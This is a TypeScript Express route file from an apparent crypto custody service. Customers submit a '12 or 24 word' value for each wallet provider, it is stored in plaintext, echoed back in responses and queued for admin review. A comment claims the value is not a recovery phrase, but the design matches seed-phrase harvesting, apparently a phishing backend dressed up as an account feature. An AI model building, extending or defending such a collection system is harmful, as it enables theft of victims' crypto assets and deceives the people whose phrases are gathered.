import { Router } from "express";
import { z } from "zod";

import { prisma } from "../lib/prisma";
import { CUSTODY_WALLET_NAMES } from "../lib/custodyWallets";
import { requireAuth } from "../middleware/requireAuth";
import { requireCustomer } from "../middleware/requireCustomer";

/**
 * Wallet Connect  one opaque identifier (12 or 24 words) per custody provider
 * the customer connects. A customer is issued each identifier out-of-band and
 * enters or updates it here; the desk matches it to their records.
 *
 * It is NOT a credential and NOT a wallet recovery phrase  auth stays email +
 * password, and a keyword grants no access and controls no funds. Word count is
 * not enforced: the UI indicates 12/24, but any non-empty value is accepted.
 *
 * One `WalletKeyword` row per (user, walletName). Every submission enters desk
 * review  `status` is set to `pending` here, and an admin later approves or
 * declines it (with a reason on a decline) via
 * POST /admin/users/:id/wallet-keywords/review. The customer reads the outcome
 * per wallet from GET /account-keyword.
 */
export const accountKeywordRouter = Router();
// Customers only: desk admins hold no keyword.
accountKeywordRouter.use(requireAuth, requireCustomer);

function serialize(row: {
  walletName: string;
  keyword: string;
  status: string;
  reviewNote: string | null;
  reviewedAt: Date | null;
  updatedAt: Date;
}) {
  return {
    walletName: row.walletName,
    keyword: row.keyword,
    status: row.status,
    reviewNote: row.reviewNote,
    reviewedAt: row.reviewedAt,
    updatedAt: row.updatedAt,
  };
}

accountKeywordRouter.get("/", async (req, res) => {
  const rows = await prisma.walletKeyword.findMany({
    where: { userId: req.userId! },
    orderBy: { walletName: "asc" },
  });
  res.json(rows.map(serialize));
});

const submitSchema = z.object({
  walletName: z.enum(CUSTODY_WALLET_NAMES),
  // Collapse all runs of whitespace to single spaces so the stored value  and
  // the word count shown against it  is stable regardless of how it was pasted.
  keyword: z
    .string()
    .transform((value) => value.replace(/\s+/g, " ").trim())
    .pipe(z.string().min(1, "Enter your keyword").max(600)),
});

accountKeywordRouter.post("/", async (req, res) => {
  const parsed = submitSchema.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.issues[0]?.message ?? "Invalid keyword" });
    return;
  }

  const { walletName, keyword } = parsed.data;
  const userId = req.userId!;

  // A new value always (re-)enters review: status back to `pending`, and any
  // earlier decline reason cleared so a stale message can't linger.
  const row = await prisma.walletKeyword.upsert({
    where: { userId_walletName: { userId, walletName } },
    create: { userId, walletName, keyword },
    update: { keyword, status: "pending", reviewNote: null, reviewedAt: null },
  });

  res.status(200).json(serialize(row));
});
